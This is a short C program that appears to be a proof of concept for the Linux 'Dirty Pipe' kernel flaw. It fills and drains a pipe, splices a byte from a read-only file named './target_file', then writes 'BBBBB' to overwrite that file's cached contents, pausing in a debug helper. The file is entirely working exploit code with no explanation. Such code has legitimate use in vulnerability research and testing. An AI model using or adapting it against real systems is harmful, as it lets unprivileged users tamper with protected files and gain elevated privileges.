#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

#define PAGESIZE    4096

void fill_pipe(int pipefd_w)
{
    for (int i = 1; i <= PAGESIZE / 8; i++) {
        if (write(pipefd_w, "AAAAAAAA", 8) != 8) {
            exit(1);
        }
    }
}

void drain_pipe(int pipefd_r)
{
    char buf[8];
    for (int i = 1; i <= PAGESIZE / 8; i++) {
        if (read(pipefd_r, buf, 8) != 8) {
            exit(1);
        }
    }
}

void setup_pipe(int pipefd_r, int pipefd_w)
{
    if (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) {
        exit(1);
    }
    fill_pipe(pipefd_w);
    drain_pipe(pipefd_r);
}

void debug()
{
    puts("pause");
    getchar();
    return;
}

int main()
{
    int fd = open("./target_file", O_RDONLY);
    if (fd == -1)
    {
        perror("open");
        return 1;
    }
    printf("open success\n");

    int pipefds[2];
    if (pipe(pipefds)) 
    {
        perror("pipe");
        return 1;
    }

    setup_pipe(pipefds[0], pipefds[1]);

    if (splice(fd, 0, pipefds[1], 0, 1, 0) < 0) {
        exit(1);
    }

    if (write(pipefds[1], "BBBBB", 5) != 5) {
        exit(1);
    }

    debug();
    close(fd);
    return 0;
}
